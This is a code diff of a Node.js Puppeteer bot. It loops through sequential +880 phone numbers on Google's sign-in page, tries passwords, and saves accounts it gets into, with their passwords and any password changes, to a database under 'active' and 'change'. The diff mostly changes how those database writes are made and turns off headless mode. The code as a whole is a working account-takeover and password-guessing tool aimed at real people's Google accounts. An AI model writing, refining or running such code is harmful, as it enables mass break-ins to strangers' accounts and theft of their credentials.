@@ -86,9 +86,9 @@ module.exports = class {
                     if(!error) {
                         if(body['start_'+SIZE] == null) {
                             mNumber = parseInt(SIRIAL+mSirial+'000000')
-                            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
-                            database.child('server').child(SERVER).child('start_'+SIZE).set(parseInt(SIRIAL+mSirial))
-                            database.child('sirial').child(SIRIAL).set(mSirial+1)
+                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                            database.set('/number/server/'+SERVER+'/start_'+SIZE, parseInt(SIRIAL+mSirial))
+                            database.set('/number/sirial/'+SIRIAL, mSirial+1)
                         } else {
                             mSirial = parseInt(body['start_'+SIZE])
                             mNumber = parseInt(body['runing_'+SIZE])
@@ -119,7 +119,7 @@ async function startService() {
     ;(async () => {
 
         browser = await puppeteer.launch({
-            headless: true,
+            headless: false,
             args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
         })
 
@@ -162,18 +162,18 @@ async function startService() {
                     mNumber++
                     mLoad++
                     mPasswordTry = 0
-                    database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                     page.goBack()
                 } else {
                     if(output) {
                         mNumber++
                         mLoad++
                         if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
-                            database.child('server').child(SERVER).child('runing_'+SIZE).set(0)
+                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
                         } else {
                             if(mLoad % 10 == 0) {
                                 console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
-                                database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                                database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                             }
                             await page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
                             await page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
@@ -205,7 +205,7 @@ async function startService() {
                     mNumber++
                     mLoad++
                     mPasswordTry = 0
-                    database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                     page.goBack()
                 } else {
                     if(output) {
@@ -247,7 +247,7 @@ async function startService() {
                     })
 
                     if(!output) {
-                        database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                         mPasswordTry = 0
                         await page.goto(signin)
                     }
@@ -313,11 +313,11 @@ async function startService() {
                             mNumber++
                             mLoad++
                             if(header == 1) {
-                                database.child('menually').child(mNumber-1).set(mPasswordTry)
+                                database.set('/number/menually/'+(mNumber-1),mPasswordTry)
                             } else {
-                                database.child('reject').child(mNumber-1).set(mPasswordTry)
+                                database.set('/number/reject/'+(mNumber-1),mPasswordTry)
                             }
-                            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                             mPasswordTry = 0
                             mPassword = 'null'
                             page.goBack()
@@ -339,13 +339,13 @@ async function startService() {
                     mNumber++
                     mLoad++
                     let now = parseInt(new Date().getTime() / 60000)
-                    database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                     if(mPasswordChange) {
-                        database.child('change').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPassword, time : now })
+                        database.update('/number/change/'+gmail.replace('@gmail.com', '').replace('.',''), { number : mNumber-1, pass : mPassword, time : now })
                         mPasswordChange = false
                         mPassword = 'null'
                     } else {
-                        database.child('active').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPasswordTry, time : now })
+                        database.update('/number/active/'+gmail.replace('@gmail.com', '').replace('.',''), { number : mNumber-1, pass : mPasswordTry, time : now })
                     }
                     mPasswordTry = 0
                     await delay(1000)
@@ -393,9 +393,9 @@ async function checkPassword() {
         mLoad++
         mLoadPassword = false
         if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
-            database.child('server').child(SERVER).child('runing_'+SIZE).set(0)
+            database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
         } else {
-            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
             page.goBack()
         }
     } else {
